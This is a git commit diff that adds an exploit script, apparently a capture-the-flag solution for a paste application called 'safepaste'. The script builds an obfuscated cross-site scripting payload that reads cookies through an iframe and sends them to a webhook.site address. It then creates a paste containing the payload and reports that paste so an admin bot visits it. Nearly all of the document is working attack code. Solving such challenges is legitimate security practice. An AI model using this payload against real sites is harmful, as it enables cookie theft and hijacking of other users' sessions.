6990ea0aa6cf007d81b62666982f8f0ba5c04b07
Tran Trung Nhan <bonhan1802@gmail.com>
2026-03-05 18:25:27 +0700

    update

--- safepaste/solve.py
+++ safepaste/solve.py
@@ -1,5 +1,32 @@
+import base64
+
 import requests
 
-# sample payload: <img src="abc$`<JS-payload>">
+# sample payload: <img src="abc$`<img src=x onerror=<JS_CODE>>">
+URL = "http://localhost:3000"
+webhook = "https://webhook.site/cbd53765-d5a5-4e15-97ac-dab9e15d7cbc"
+js_code = f'''
+    let ifr = document.createElement('iframe');
+    ifr.src = "/hidden/404";
+    ifr.onload = () => {{
+        let c = ifr.contentDocument.cookie;
+        window.location= "{webhook}?c=" + encodeURIComponent(c);
+    }}
+    document.body.appendChild(ifr);
+'''.replace("\n", "")
+js_code = base64.b64encode(js_code.encode()).decode()
+js_code = f"eval(atob('{js_code}'))"
+# payload = f'<img src="abc$`<img src=x onerror="{js_code}">">'
+# use title instead of src to bypass url encode
+payload = f'<p title="$` <img src=x onerror={js_code}>"></p>'
 
-js_code = 
+session = requests.Session()
+response = session.post(URL+"/create", data={"content": payload}, allow_redirects=False)
+if response.status_code == 302:
+    print("Response:", response.text[:40])
+    paste = URL + response.headers["Location"]
+    print("Paste URL:", paste)
+    response = session.post(url=URL+'/report', data={"url": paste})
+    print("Report response:", response.status_code, response.text)
+else:
+    print("Failed to create paste:", response.status_code, response.text)
